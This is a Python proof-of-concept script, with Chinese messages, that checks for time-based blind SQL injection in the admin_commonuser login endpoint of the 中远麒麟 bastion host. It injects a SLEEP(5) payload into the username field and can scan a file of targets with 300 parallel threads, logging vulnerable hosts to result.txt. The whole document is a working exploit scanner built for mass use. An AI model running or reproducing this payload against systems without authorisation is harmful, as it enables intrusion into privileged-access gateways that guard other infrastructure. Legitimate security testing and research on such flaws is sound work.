import requests, argparse, sys, time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    test = """

  ____   ___  _       _        _           _   _             
 / ___| / _ \| |     (_)_ __  (_) ___  ___| |_(_) ___  _ __  
 \___ \| | | | |     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
  ___) | |_| | |___  | | | | || |  __/ (__| |_| | (_) | | | |
 |____/ \__\_\_____| |_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                            |__/                                                                  
"""
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False)
        time1 = str(res.elapsed.total_seconds())[0]
        # print(time)
        if res.status_code == 200:
            if '4' < time1 < '6':
                print(f"[+] {target} 存在sql延时注入漏洞！")
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f"[-] {target} 不存在漏洞！")
    except Exception as e:
        print(f'该url存在问题{target}，请手动注入')



if __name__ == '__main__':
    main()